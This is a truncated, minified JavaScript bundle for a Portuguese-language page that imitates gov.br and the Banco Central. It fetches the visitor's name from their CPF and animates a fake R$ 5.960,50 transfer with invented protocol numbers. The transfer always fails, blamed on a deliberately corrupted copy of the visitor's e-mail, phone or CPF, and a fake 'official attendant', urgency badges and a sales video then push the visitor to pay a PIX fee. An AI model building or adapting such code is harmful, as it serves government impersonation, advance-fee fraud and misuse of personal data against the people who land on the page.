import{G as e,U as t,s as n}from"./link-r9kbiy_g.js";import{o as r}from"./cpf-dgoKKsKu.js";import{i,n as a,t as o}from"./consulta.functions-DfJNii7V.js";import{t as s}from"./useQuery-B745tNUT.js";import{c,f as l}from"./index-BZ0JSO7J.js";import{t as u}from"./circle-check-Cv2uSYvG.js";import{n as ee,r as d,t as te}from"./contato-DxATZAWb.js";import{t as f}from"./lock-CTXzcoV2.js";import{n as p,t as m}from"./usePagouGate-Dm8uf0ty.js";import{n as h,r as g}from"./CpfConsulta-BX-srMNW.js";import{t as _}from"./govbr-logo.png.asset-DpBzinid.js";import{n as v,r as y,t as b}from"./pix.functions-DyFiMvAH.js";var x=e(t(),1),S=`
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'Segoe UI', sans-serif;
    background-color: #f2f2f2;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    min-height: 100vh;
    padding: 1rem;
  }

  .card, .loading, .card-final {
    padding-top: 0.5rem;
    max-width: 420px;
    width: 100%;
    display: none;
    flex-direction: column;
    gap: 0.5rem;
    background-color: #fff;
    border-radius: 12px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    padding: 1.5rem;
  }

  .loading {
    margin-top: 4vh;
  }

  .card.active, .loading.active, .card-final.active {
    display: flex;
  }

  .loading-sub {
    font-size: 0.78rem;
    color: #666;
    margin-top: 0.6rem;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 0.5rem;
  }
  .loading-sub .dot {
    width: 8px; height: 8px; border-radius: 50%;
    background: #168821;
    box-shadow: 0 0 0 0 rgba(22,136,33,0.6);
    animation: liveDot 1.2s ease-in-out infinite;
    display: inline-block;
    flex-shrink: 0;
  }
  @keyframes liveDot {
    0%, 100% { box-shadow: 0 0 0 0 rgba(22,136,33,0.6); }
    50% { box-shadow: 0 0 0 6px rgba(22,136,33,0); }
  }
  .loading-meta {
    display: flex;
    align-items: center;
    gap: 0.4rem;
    color: #444;
  }
  .pct {
    font-weight: 700;
    color: #005CA9;
    font-variant-numeric: tabular-nums;
  }

  .card.active, .loading.active, .card-final.active {
    display: flex;
  }

  .logo { width: 120px; margin-bottom: 1.5rem; }
  h2 { font-size: 1.3rem; margin-bottom: 0.3rem; color: #005CA9; }
  .value {
    font-size: 2rem;
    font-weight: 800;
    color: #005CA9;
    margin-bottom: 0.5rem;
  }

  .recipient { font-size: 0.95rem; color: #444; margin-bottom: 1.5rem; }
  .recipient b { font-weight: 600; }

  .info-line {
    display: flex;
    justify-content: space-between;
    font-size: 0.95rem;
    margin-bottom: 0.8rem;
    color: #444;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid #e0e0e0;
  }

  .box {
    margin-top: 1.5rem;
    background: #e9f2fb;
    border: 1px solid #c8ddf0;
    border-radius: 10px;
    padding: 1rem;
    font-size: 0.9rem;
    color: #333;
    text-align: center;
    line-height: 1.4;
  }

  .button, .final-button {
    display: block;
    margin-top: 1.5rem;
    width: 100%;
    background-color: #005CA9;
    color: white;
    border: none;
    border-radius: 8px;
    padding: 1rem;
    font-size: 1rem;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: background-color 0.2s;
  }

  .button:hover, .final-button:hover { background-color: #004a87; }
  .button:active, .final-button:active { background-color: #003b6d; }

  .progress-bar {
    width: 100%;
    height: 6px;
    background-color: #e0e0e0;
    border-radius: 4px;
    overflow: hidden;
  }

  .progress-bar-fill {
    height: 100%;
    width: 0%;
    background-color: #005CA9;
    transition: width 0.1s linear;
  }

  .status-text {
    font-size: 1.4rem;
    font-weight: 600;
    margin-bottom: 1rem;
    color: #005CA9;
  }

  .fade-out-up { opacity: 0; transform: translateY(-20px); }
  .fade-in-up { opacity: 1; transform: translateY(0); }

  .wrapper-final {
    background-color: #f5f7fa;
    padding: 1rem;
    border-radius: 1rem;
    display: grid;
    grid-template-rows: repeat(3, auto);
    gap: 0.5rem;
    min-height: 360px;
    border: 1px solid #d8e2ed;
  }

  .alert-box {
    background: #fff;
    border-radius: 10px;
    padding: 1rem;
    display: none;
    align-items: center;
    gap: 0.5rem;
    font-size: 0.95rem;
    color: #333;
    opacity: 0;
    transform: translateY(10px);
    animation: fadeInUp 0.3s ease forwards;
    border: 1px solid #e0e0e0;
  }

  .alert-box.red {
    background: #f8d7da;
    color: #721c24;
    font-weight: bold;
    border: 1px solid #f5c6cb;
  }

  @keyframes fadeInUp {
    to { opacity: 1; transform: translateY(0); }
  }

  .icon-img { width: 2rem; height: 2rem; }

  .spinner {
    border: 3px solid #ccc;
    border-top: 3px solid #005CA9;
    border-radius: 50%;
    width: 24px;
    height: 24px;
    animation: spin 0.7s linear infinite;
    margin: auto;
  }

  .official-bar {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 5px;
    background: linear-gradient(to right, #005CA9 70%, #F39200 30%);
  }

  .gov-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding-bottom: 0.75rem;
    margin-bottom: 0.75rem;
    border-bottom: 1px solid #e6e6e6;
  }
  .govbr-logo { height: 26px; width: auto; }
  .gov-badge {
    display: inline-flex;
    align-items: center;
    gap: 0.3rem;
    font-size: 0.72rem;
    font-weight: 700;
    color: #1351B4;
    background: #e8f0fb;
    padding: 0.25rem 0.55rem;
    border-radius: 999px;
    border: 1px solid #c8ddf0;
    text-transform: uppercase;
    letter-spacing: 0.03em;
  }
  .gov-subtitle {
    font-size: 0.8rem;
    color: #555;
    margin-bottom: 0.75rem;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  .mandatory-note {
    margin-top: 1rem;
    background: #fff8e1;
    border: 1px solid #f0c36d;
    border-left: 4px solid #b00020;
    border-radius: 10px;
    padding: 0.9rem 1rem;
    font-size: 0.88rem;
    color: #3b2a00;
    line-height: 1.45;
  }
  .mandatory-title {
    display: flex;
    align-items: center;
    gap: 0.4rem;
    font-weight: 800;
    color: #b00020;
    font-size: 0.78rem;
    letter-spacing: 0.04em;
    margin-bottom: 0.4rem;
    text-transform: uppercase;
  }
  .urgency-row {
    display: flex;
    flex-wrap: wrap;
    gap: 0.4rem;
    margin-top: 0.7rem;
  }
  .urgency-pill {
    display: inline-flex;
    align-items: center;
    gap: 0.3rem;
    background: #fff;
    border: 1px solid #f0c36d;
    color: #b00020;
    font-weight: 700;
    font-size: 0.72rem;
    padding: 0.3rem 0.6rem;
    border-radius: 999px;
  }
  .urgency-pill.safe {
    color: #168821;
    border-color: #c3e6cb;
    background: #e8f5ec;
  }
  .final-button {
    background: linear-gradient(180deg, #1aa64a 0%, #128a3a 100%);
    color: #fff;
    border: none;
    border-radius: 12px;
    padding: 1.05rem 1rem;
    font-size: 1.05rem;
    font-weight: 800;
    letter-spacing: 0.02em;
    box-shadow: 0 10px 24px rgba(18, 138, 58, 0.35), inset 0 1px 0 rgba(255,255,255,0.25);
    animation: pulse 1.6s ease-in-out infinite;
    cursor: pointer;
    width: 100%;
    transition: transform .15s ease, box-shadow .15s ease, filter .15s ease;
  }
  .final-button:hover { filter: brightness(1.05); box-shadow: 0 12px 28px rgba(18,138,58,0.45); }
  .final-button:active { transform: translateY(1px); filter: brightness(0.95); }
  #cta-wrapper { margin-top: 1rem; }
  @keyframes pulse {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.02); }
  }
  .progress-bar-fill.error { background-color: #b00020; }
  .status-text.error { color: #b00020; }
  .error-box {
    margin-top: 1rem;
    background: transparent;
    border: none;
    padding: 0;
    text-align: center;
    animation: fadeInUp 0.4s ease forwards;
  }

  /* === Checklist do loading === */
  .check-list {
    list-style: none;
    margin-top: 1rem;
    padding: 0.75rem 0.85rem;
    background: #f7f9fc;
    border: 1px solid #e2e8ef;
    border-radius: 10px;
    display: grid;
    gap: 0.5rem;
  }
  .check-list li {
    display: flex;
    align-items: center;
    gap: 0.55rem;
    font-size: 0.82rem;
    color: #94a3b8;
    transition: color .25s ease;
  }
  .check-list li .ck-icon {
    width: 16px; height: 16px; border-radius: 50%;
    border: 1.5px solid #cbd5e1;
    background: #fff;
    flex-shrink: 0;
    position: relative;
    transition: all .25s ease;
  }
  .check-list li.loading .ck-icon {
    border-color: #005CA9;
    border-top-color: transparent;
    animation: spin 0.7s linear infinite;
  }
  .check-list li.done {
    color: #1f2937;
  }
  .check-list li.done .ck-icon {
    background: #168821;
    border-color: #168821;
  }
  .check-list li.done .ck-icon::after {
    content: '';
    position: absolute;
    left: 4px; top: 1px;
    width: 4px; height: 8px;
    border: solid #fff;
    border-width: 0 2px 2px 0;
    transform: rotate(45deg);
  }
  .check-list li.fail .ck-icon {
    background: #b00020; border-color: #b00020;
  }
  .check-list li.fail .ck-icon::after {
    content: '×';
    position: absolute;
    inset: 0;
    color: #fff;
    font-size: 14px;
    font-weight: 800;
    line-height: 14px;
    text-align: center;
  }
  .check-list li.fail { color: #b00020; }

  .tech-foot {
    margin-top: 0.7rem;
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 0.4rem;
    font-size: 0.7rem;
    color: #94a3b8;
    background: #0f172a;
    color: #cbd5e1;
    padding: 0.55rem 0.7rem;
    border-radius: 8px;
    font-variant-numeric: tabular-nums;
    font-family: 'Courier New', monospace;
  }
  .tech-foot div { display: flex; flex-direction: column; gap: 2px; }
  .tech-foot span { font-size: 0.62rem; opacity: 0.65; text-transform: uppercase; letter-spacing: 0.05em; }
  .tech-foot b { color: #f1f5f9; font-weight: 600; font-size: 0.74rem; }

  /* === Comprovante de transferência (FALHA) === */
  .receipt {
    position: relative;
    background: #fff;
    border: 1px solid #e2e8ef;
    border-radius: 10px;
    padding: 1.1rem 1rem 1.2rem;
    text-align: left;
    box-shadow: 0 6px 18px rgba(15, 23, 42, 0.08);
    margin-top: 0.5rem;
  }
  .receipt-perf {
    position: absolute;
    left: -6px; right: -6px;
    height: 14px;
    background:
      radial-gradient(circle at 7px 7px, #f2f2f2 6px, transparent 6.5px) repeat-x;
    background-size: 14px 14px;
  }
  .receipt-perf.top { top: -7px; }
  .receipt-perf.bottom { bottom: -7px; }
  .receipt-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 0.6rem;
    padding-bottom: 0.7rem;
    border-bottom: 1.5px dashed #d8e2ed;
  }
  .receipt-logo { height: 26px; width: auto; }
  .receipt-stamp {
    color: #b00020;
    border: 2.5px solid #b00020;
    padding: 0.18rem 0.55rem;
    border-radius: 4px;
    font-weight: 900;
    font-size: 0.9rem;
    letter-spacing: 0.18em;
    transform: rotate(-6deg);
    text-transform: uppercase;
    background: rgba(176, 0, 32, 0.04);
    box-shadow: inset 0 0 0 1px rgba(176, 0, 32, 0.25);
  }
  .receipt-title {
    font-weight: 800;
    color: #0f172a;
    font-size: 0.98rem;
    margin-top: 0.7rem;
  }
  .receipt-sub {
    font-size: 0.72rem;
    color: #64748b;
    margin-bottom: 0.7rem;
    letter-spacing: 0.02em;
  }
  .receipt-status {
    display: flex;
    align-items: center;
    gap: 0.45rem;
    background: #fdecea;
    border: 1px solid #f5c6cb;
    border-radius: 6px;
    padding: 0.5rem 0.65rem;
    font-size: 0.82rem;
    color: #4a1c1f;
    margin-bottom: 0.8rem;
  }
  .receipt-status b { color: #b00020; }
  .receipt-rows {
    display: grid;
    gap: 0.35rem;
    font-size: 0.8rem;
    font-variant-numeric: tabular-nums;
  }
  .rr-section {
    font-size: 0.65rem;
    font-weight: 800;
    letter-spacing: 0.08em;
    color: #64748b;
    text-transform: uppercase;
    margin-top: 0.45rem;
    padding-top: 0.45rem;
    border-top: 1px dashed #e2e8ef;
  }
  .rr-section:first-child { border-top: none; margin-top: 0; padding-top: 0; }
  .rr {
    display: flex;
    justify-content: space-between;
    gap: 0.5rem;
    color: #475569;
  }
  .rr b {
    color: #0f172a;
    font-weight: 700;
    text-align: right;
    word-break: break-word;
  }
  .rr-amount { color: #b00020 !important; font-size: 0.95rem; }
  .receipt-reason {
    margin-top: 0.85rem;
    padding: 0.7rem 0.75rem;
    background: #fff8e1;
    border: 1px solid #f0c36d;
    border-left: 4px solid #b00020;
    border-radius: 6px;
  }
  .rr-reason-title {
    font-size: 0.7rem;
    font-weight: 800;
    color: #b00020;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    margin-bottom: 0.3rem;
  }
  .rr-reason-text {
    font-size: 0.8rem;
    color: #4a3a00;
    line-height: 1.5;
  }
  .error-icon { margin-bottom: 0.4rem; }
  .error-title {
    font-weight: 800;
    color: #b00020;
    font-size: 1rem;
    margin-bottom: 0.25rem;
  }
  .error-msg {
    font-size: 0.88rem;
    color: #4a1c1f;
    line-height: 1.5;
    text-align: left;
  }
  .err-details {
    margin-top: 0.7rem;
    background: #fff;
    border: 1px solid #f1c6c9;
    border-radius: 8px;
    padding: 0.6rem 0.75rem;
    font-size: 0.78rem;
    color: #444;
    display: grid;
    gap: 0.25rem;
    font-variant-numeric: tabular-nums;
  }
  .err-details div {
    display: flex;
    justify-content: space-between;
    gap: 0.5rem;
  }
  .err-details b { color: #b00020; font-weight: 700; }
  .err-help {
    margin-top: 0.7rem;
    font-size: 0.82rem;
    color: #6b1118;
    font-weight: 600;
  }
  .error-btn {
    background: #b00020 !important;
    margin-top: 1rem !important;
    box-shadow: 0 6px 16px rgba(176, 0, 32, 0.35);
    animation: pulse 1.6s ease-in-out infinite;
  }
  .error-btn:hover { background: #8a0019 !important; }

  /* === VSL UPSELL === */
  .vsl-wrap {
    position: relative;
    width: 100%;
    border-radius: 12px;
    overflow: hidden;
    background: #000;
    box-shadow: 0 6px 20px rgba(0,0,0,0.25);
  }
  .vsl-wrap video {
    width: 100%;
    display: block;
    border-radius: 12px;
  }
  .vsl-play-overlay {
    position: absolute;
    inset: 0;
    background: rgba(0,0,0,0.55);
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 5;
  }
  .vsl-play-overlay .play-circle {
    width: 72px;
    height: 72px;
    border-radius: 50%;
    background: rgba(255,255,255,0.95);
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 8px 24px rgba(0,0,0,0.4);
    animation: pulse 1.6s ease-in-out infinite;
  }
  .vsl-play-overlay .play-circle::after {
    content: '';
    border-style: solid;
    border-width: 14px 0 14px 22px;
    border-color: transparent transparent transparent #b00020;
    margin-left: 4px;
  }
  .vsl-hint {
    text-align: center;
    font-size: 0.82rem;
    color: #b00020;
    font-weight: 700;
    margin-top: 0.6rem;
  }
  .pix-error-box {
    margin-top: 1rem;
    background: #fff5f5;
    border: 1.5px solid #f5c6cb;
    border-left: 4px solid #b00020;
    border-radius: 10px;
    padding: 0.9rem 1rem;
    display: none;
    animation: fadeInUp 0.4s ease forwards;
  }
  .pix-error-title {
    font-weight: 800;
    color: #b00020;
    font-size: 0.85rem;
    text-transform: uppercase;
    letter-spacing: 0.04em;
    margin-bottom: 0.5rem;
    display: flex;
    align-items: center;
    gap: 0.4rem;
  }
  .pix-error-box .pix-key {
    font-family: 'Courier New', monospace;
    font-size: 1.05rem;
    font-weight: 800;
    color: #b00020;
    background: #fff;
    border: 1px dashed #f5c6cb;
    border-radius: 6px;
    padding: 0.55rem 0.7rem;
    text-align: center;
    word-break: break-all;
    margin: 0.4rem 0;
  }
  .pix-error-box .pix-desc {
    font-size: 0.85rem;
    color: #4a1c1f;
    line-height: 1.45;
  }
  .pix-error-box .pix-desc b { color: #b00020; }
  .countdown-play {
    text-align: center;
    font-size: 0.78rem;
    color: #555;
    margin-top: 0.5rem;
    font-variant-numeric: tabular-nums;
  }
  .countdown-play b { color: #b00020; }
`;function C(e,t){let n=[],r=0;for(;r<e.length;){let i=e.indexOf(`{`,r);if(i===-1)break;let a=e.slice(r,i).trim(),o=0,s=i;for(;s<e.length;s++)if(e[s]===`{`)o++;else if(e[s]===`}`&&(o--,o===0))break;let c=e.slice(i+1,s);if(r=s+1,a.startsWith(`@`)){/^@(keyframes|font-face|supports|-webkit-keyframes)/i.test(a)?n.push(`${a}{${c}}`):/^@media/i.test(a)?n.push(`${a}{${C(c,t)}}`):n.push(`${a}{${c}}`);continue}let l=a.split(`,`).map(e=>{let n=e.trim();return n?n===`html`||n===`body`?t:n.startsWith(`html `)||n.startsWith(`body `)?`${t} ${n.replace(/^(html|body)\s+/,``)}`:`${t} ${n}`:null}).filter(Boolean).join(`,`);l&&n.push(`${l}{${c}}`)}return n.join(`
`)}var w=e(y(),1),T=n();function E({cpf:e,amount:t,titulo:n,onPaid:r}){let c=i(o),g=i(b),_=i(v),{data:y,isFetched:S}=s({queryKey:[`consulta-cpf`,e],queryFn:()=>c({data:{cpf:e}}),enabled:e.length===11,retry:!1,staleTime:300*1e3}),C=y&&y.ok?y.pessoa:null,E=C?.nome?.trim()||`Vendas Saque`,[D,O]=(0,x.useState)(!0),[k,A]=(0,x.useState)(null),[j,M]=(0,x.useState)(null),[N,P]=(0,x.useState)(null),[F,I]=(0,x.useState)(null),[L,R]=(0,x.useState)(!1),[z,B]=(0,x.useState)(!1),[V,H]=(0,x.useState)(!1),U=(0,x.useRef)(!1),W=(0,x.useRef)(!1),G=`pix:${e}:${t}`;(0,x.useEffect)(()=>{j&&w.toDataURL(j,{width:512,margin:1}).then(P).catch(()=>P(null))},[j]),(0,x.useEffect)(()=>{if(!F||L)return;let e=Date.now(),n=0,i=!1;async function a(){try{(await _({data:{transactionId:F}})).status===`COMPLETED`&&(i=!0,window.clearInterval(n),R(!0),await l(t/100,F),r())}catch{}}function o(t){window.clearInterval(n),n=window.setInterval(()=>{i||(a(),Date.now()-e>120*1e3&&t===8e3&&o(15e3))},t)}o(8e3);let s=window.setTimeout(()=>window.clearInterval(n),900*1e3);return()=>{window.clearInterval(n),window.clearTimeout(s)}},[F,_,L,r,t]);async function K(){if(!W.current){W.current=!0,A(null),O(!0);try{let r=typeof window<`u`?window.sessionStorage.getItem(G):null;if(r){let e=JSON.parse(r);if(e.pixCode&&e.transactionId){M(e.pixCode),I(e.transactionId),O(!1);return}}let i=typeof window<`u`?window.location.search.replace(/^\?/,``):``,a=await g({data:{amount:t,name:E,document:e,email:te(E,e),phone:ee(e),title:n,utm:i}});if(a.ok){M(a.charge.pixCode),I(a.charge.transactionId);try{window.sessionStorage.setItem(G,JSON.stringify({pixCode:a.charge.pixCode,transactionId:a.charge.transactionId}))}catch{}}else A(a.error)}catch(e){A(e instanceof Error?e.message:`Falha ao gerar o PIX.`)}finally{W.current=!1,O(!1)}}}(0,x.useEffect)(()=>{e.length!==11||!S||U.current||(U.current=!0,K())},[e,S]);let ne=m({copiou:V});async function re(){if(j)try{await navigator.clipboard.writeText(j),B(!0),H(!0),window.setTimeout(()=>B(!1),2500)}catch{A(`Não foi possível copiar. Selecione o código manualmente.`)}}return(0,T.jsxs)(`section`,{className:`overflow-hidden rounded-2xl bg-card shadow-[var(--shadow-card)] ring-1 ring-border`,children:[(0,T.jsxs)(`div`,{className:`border-b border-border px-4 py-3`,children:[(0,T.jsx)(`p`,{className:`text-[10px] font-bold uppercase tracking-widest text-muted-foreground`,children:`Beneficiário`}),(0,T.jsx)(`p`,{className:`mt-1 text-sm font-extrabold uppercase text-brand-navy`,children:C?.nome||E}),(0,T.jsxs)(`p`,{className:`mt-0.5 font-mono text-xs text-muted-foreground`,children:[`CPF: `,h(e)]})]}),(0,T.jsx)(`div`,{className:`px-4 py-4`,children:L?(0,T.jsxs)(`div`,{className:`rounded-xl border border-emerald-300 bg-emerald-50 p-4 text-center text-sm text-emerald-900`,children:[(0,T.jsx)(u,{className:`mx-auto size-7 text-emerald-600`}),(0,T.jsx)(`p`,{className:`mt-2 font-bold`,children:`Pagamento confirmado!`}),(0,T.jsx)(`p`,{className:`mt-1`,children:`Encaminhando para a próxima etapa…`})]}):j?(0,T.jsxs)(`div`,{className:`space-y-3 text-center`,children:[N?(0,T.jsx)(`img`,{src:N,alt:`QR Code PIX para pagamento da taxa`,className:`mx-auto size-52 rounded-xl border border-border bg-white p-2`}):(0,T.jsx)(`div`,{className:`mx-auto grid size-52 place-items-center rounded-xl border border-border`,children:(0,T.jsx)(a,{className:`size-6 animate-spin text-muted-foreground`})}),(0,T.jsx)(`p`,{className:`text-xs text-muted-foreground`,children:`Escaneie o QR Code no app do seu banco ou use o PIX copia e cola.`}),(0,T.jsx)(`p`,{className:`break-all rounded-xl bg-muted px-3 py-2 text-left font-mono text-[11px] text-foreground`,children:j}),(0,T.jsxs)(`button`,{type:`button`,onClick:re,className:`flex w-full items-center justify-center gap-2 rounded-xl bg-brand-navy px-4 py-4 text-base font-extrabold uppercase tracking-wide text-primary-foreground transition hover:brightness-110`,children:[(0,T.jsx)(d,{className:`size-5`,"aria-hidden":!0}),z?`Código copiado!`:`Copiar código PIX`]}),(0,T.jsxs)(`p`,{className:`flex items-center justify-center gap-2 text-xs text-muted-foreground`,children:[(0,T.jsx)(a,{className:`size-3.5 animate-spin`,"aria-hidden":!0}),`Aguardando confirmação do pagamento…`]}),k&&(0,T.jsx)(`p`,{className:`text-xs font-medium text-destructive`,children:k}),ne&&F&&(0,T.jsx)(p,{nome:C?.nome||E,cpf:e,transactionId:F,amount:t,etapa:`upsell`})]}):(0,T.jsxs)(`div`,{className:`space-y-3 py-6 text-center`,children:[(0,T.jsx)(a,{className:`mx-auto size-7 animate-spin text-brand-navy`,"aria-hidden":!0}),(0,T.jsx)(`p`,{className:`text-sm font-semibold text-foreground`,children:D?`Gerando PIX…`:`Preparando pagamento…`}),k&&(0,T.jsxs)(`div`,{className:`space-y-3`,children:[(0,T.jsx)(`p`,{className:`text-xs font-medium text-destructive`,children:k}),(0,T.jsx)(`button`,{type:`button`,onClick:K,disabled:D,className:`w-full rounded-xl bg-emerald-600 px-4 py-4 text-base font-extrabold uppercase tracking-wide text-white transition hover:brightness-110 disabled:opacity-70`,children:`Tentar novamente`})]})]})}),(0,T.jsxs)(`div`,{className:`flex items-center justify-between gap-3 border-t border-border bg-muted/50 px-4 py-2.5 text-[11px] text-muted-foreground`,children:[(0,T.jsxs)(`span`,{className:`inline-flex items-center gap-1.5`,children:[(0,T.jsx)(f,{className:`size-3.5 text-emerald-600`,"aria-hidden":!0}),`PAGAMENTO CRIPTOGRAFADO`]}),(0,T.jsx)(`span`,{className:`font-mono`,children:`PIX`})]})]})}var D={asset_id:`1b9c6966-5270-4723-a018-bf572ef21b32`,content_type:`image/png`,created_at:`2026-08-25T05:20:17Z`,original_filename:`bacen-logo.png`,project_id:`5c950307-f1f5-4a45-ab9a-656caf720253`,r2_key:`a/v1/5c950307-f1f5-4a45-ab9a-656caf720253/1b9c6966-5270-4723-a018-bf572ef21b32/bacen-logo.png`,size:53045,url:((typeof window!=="undefined"&&window.location.pathname.indexOf("/replay")!==-1)?"/replay":"")+`/__l5e/assets-v1/1b9c6966-5270-4723-a018-bf572ef21b32/bacen-logo.png`,version:1},O={asset_id:`bd170357-cc93-4952-8bd2-2643f2ddaba7`,content_type:`image/png`,created_at:`2026-08-25T05:20:12Z`,original_filename:`aviso.png`,project_id:`5c950307-f1f5-4a45-ab9a-656caf720253`,r2_key:`a/v1/5c950307-f1f5-4a45-ab9a-656caf720253/bd170357-cc93-4952-8bd2-2643f2ddaba7/aviso.png`,size:15127,url:((typeof window!=="undefined"&&window.location.pathname.indexOf("/replay")!==-1)?"/replay":"")+`/__l5e/assets-v1/bd170357-cc93-4952-8bd2-2643f2ddaba7/aviso.png`,version:1},k={asset_id:`bddd5c28-59d9-4ec7-adef-8dabc2eb8e4f`,content_type:`video/mp4`,created_at:`2026-08-25T05:20:52Z`,original_filename:`vsl-up1.mp4`,project_id:`5c950307-f1f5-4a45-ab9a-656caf720253`,r2_key:`a/v1/5c950307-f1f5-4a45-ab9a-656caf720253/bddd5c28-59d9-4ec7-adef-8dabc2eb8e4f/vsl-up1.mp4`,size:8674990,url:((typeof window!=="undefined"&&window.location.pathname.indexOf("/replay")!==-1)?"/replay":"")+`/__l5e/assets-v1/bddd5c28-59d9-4ec7-adef-8dabc2eb8e4f/vsl-up1.mp4`,version:1},A=C(S,`#u1v2`)+`
#u1v2{display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:1rem;background:#f2f2f2;}`,j=3422,M=21,N=74;function P(e){return(e||``).replace(/\D/g,``).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,`$1.$2.$3-$4`)}function F(){let e=new Date,t=e=>String(e).padStart(2,`0`);return`${t(e.getDate())}/${t(e.getMonth()+1)}/${e.getFullYear()}`}function I(e,t){try{window.gtag?.(`event`,e,{slug:`up1`,...t})}catch{}}var L=[{msg:`Conectando ao Banco Central…`,to:12,duration:1600,hold:1200},{msg:`Validando dados do beneficiário…`,to:28,duration:2e3,hold:1400},{msg:`Consultando chave Pix vinculada…`,to:45,duration:2200,hold:1800},{msg:`Autorizando saída de R$ 5.960,50…`,to:62,duration:2400,hold:2e3},{msg:`Gerando comprovante eletrônico…`,to:78,duration:2200,hold:1600},{msg:`Sincronizando com o SPI…`,to:92,duration:2e3,hold:1400},{msg:`Finalizando transferência…`,to:100,duration:1800,hold:0}],R=[`Conexão segura com o Banco Central`,`Validação dos dados do beneficiário`,`Consulta da chave Pix vinculada`,`Autorização do valor de R$ 5.960,50`,`Emissão de comprovante eletrônico`,`Sincronização com o SPI / BACEN`,`Finalização da transferência`],z=[`Estabelecendo canal seguro com o Banco Central…`,`Verificando disponibilidade de atendente oficial…`,`Atendente encontrado. Carregando o seu caso…`,`Abrindo comunicado oficial. Aguarde…`];function B({cpf:e,onPaid:t}){let n=i(o),{data:r}=s({queryKey:[`consulta-cpf`,e],queryFn:()=>n({data:{cpf:e}}),enabled:e.length===11,retry:!1,staleTime:300*1e3}),a=(r&&r.ok?r.pessoa:null)?.nome?.trim()||`Carregando...`,c=(0,x.useMemo)(()=>e.length===11?te(a,e):``,[a,e]),l=(0,x.useMemo)(()=>e.length===11?ee(e):``,[e]),[u,d]=(0,x.useState)(`card`),[f,p]=(0,x.useState)(0),[m,h]=(0,x.useState)(0),[g,v]=(0,x.useState)({}),[y,b]=(0,x.useState)(!1),[S,C]=(0,x.useState)(!1),[w,B]=(0,x.useState)(0),[V,H]=(0,x.useState)(180),[U,W]=(0,x.useState)(`—`),[G,K]=(0,x.useState)({proto:`—`,e2e:`—`,data:`—`}),[ne,re]=(0,x.useState)(`--/--/----`);(0,x.useEffect)(()=>{W(Array.from({length:4},()=>Math.random().toString(36).slice(2,6).toUpperCase()).join(`-`));let e=new Date,t=e=>String(e).padStart(2,`0`);re(F()),K({proto:`BCB-`+Math.floor(Math.random()*9e3+1e3)+`-`+Math.floor(Math.random()*9e5+1e5),e2e:`E`+Math.floor(Math.random()*9e7+1e7)+Date.now().toString().slice(-10),data:`${t(e.getDate())}/${t(e.getMonth()+1)}/${e.getFullYear()} · ${t(e.getHours())}:${t(e.getMinutes())}:${t(e.getSeconds())}`})},[]);let q=(0,x.useRef)(null),[J,Y]=(0,x.useState)(!1),[X,Z]=(0,x.useState)(0),Q=(0,x.useRef)(0),ie=X>=M,$=X>=N;(0,x.useEffect)(()=>{if(u!==`final`||$)return;let e=window.setTimeout(()=>Z(75),119*1e3);return()=>window.clearTimeout(e)},[u,$]);let ae=(0,x.useMemo)(()=>{if(c&&c.includes(`@`)){let[e,t]=c.split(`@`),n=(t??``).split(`.`),r=n[0]??``;r.length>2&&(r=r.slice(0,-1));let i=n.slice(1).join(`.`)||`com`;return{tipo:`E-mail`,valor:`${e}@${r}.${i}`}}let t=(l||``).replace(/\D/g,``);if(t.length>=10){let e=t.split(``);e[3]=String((Number(e[3])+1)%10);let n=e.join(``);return{tipo:`Telefone`,valor:n.length===11?`(${n.slice(0,2)}) ${n.slice(2,7)}-${n.slice(7)}`:`(${n.slice(0,2)}) ${n.slice(2,6)}-${n.slice(6)}`}}let n=e.replace(/\D/g,``);if(n.length===11){let e=n.split(``);return e[4]=String((Number(e[4])+1)%10),{tipo:`CPF`,valor:P(e.join(``))}}return{tipo:`Chave Pix`,valor:`—`}},[c,l,e]),oe=(0,x.useMemo)(()=>{if(c){let[e,t]=c.split(`@`);return`${(e??``).slice(0,2)}***@${t||`***`}`}let t=(l||``).replace(/\D/g,``);if(t)return`(${t.slice(0,2)}) *****-${t.slice(-4)}`;let n=e.replace(/\D/g,``);return n?`***.${n.slice(3,6)}.***-**`:`—`},[c,l,e]);(0,x.useEffect)(()=>{if(u!==`loading`||y)return;let e=window.setInterval(()=>H(140+Math.floor(Math.random()*180)),600);return()=>window.clearInterval(e)},[u,y]);let se=(0,x.useCallback)((e,t)=>{if(e>=L.length){v(e=>({...e,[L.length-1]:`fail`})),b(!0),window.setTimeout(()=>C(!0),2800);return}let n=L[e];h(e),v(t=>({...t,[e]:`loading`}));let r=performance.now(),i=a=>{let o=Math.min(1,(a-r)/n.duration),s=1-(1-o)**3;p(Math.round(t+(n.to-t)*s)),o<1?requestAnimationFrame(i):(p(n.to),e<L.length-1&&v(t=>({...t,[e]:`done`})),window.setTimeout(()=>se(e+1,n.to),n.hold))};requestAnimationFrame(i)},[]);function ce(){I(`upsell_sacar_click`),d(`loading`),se(0,0)}function le(){I(`upsell_atendente_click`),d(`atendente`),B(0);let e=0,t=window.setInterval(()=>{e+=1,B(Math.min(e,z.length-1)),e>=z.length-1&&window.clearInterval(t)},1500);window.setTimeout(()=>{window.clearInterval(t),d(`final`)},6200)}function ue(){I(`upsell_cta_click`,{slug:`validacao`}),d(`pix`)}(0,x.useEffect)(()=>{if(u!==`atendente`&&u!==`pix`)return;let e=document.body.style.overflow;return document.body.style.overflow=`hidden`,()=>{document.body.style.overflow=e}},[u]);let 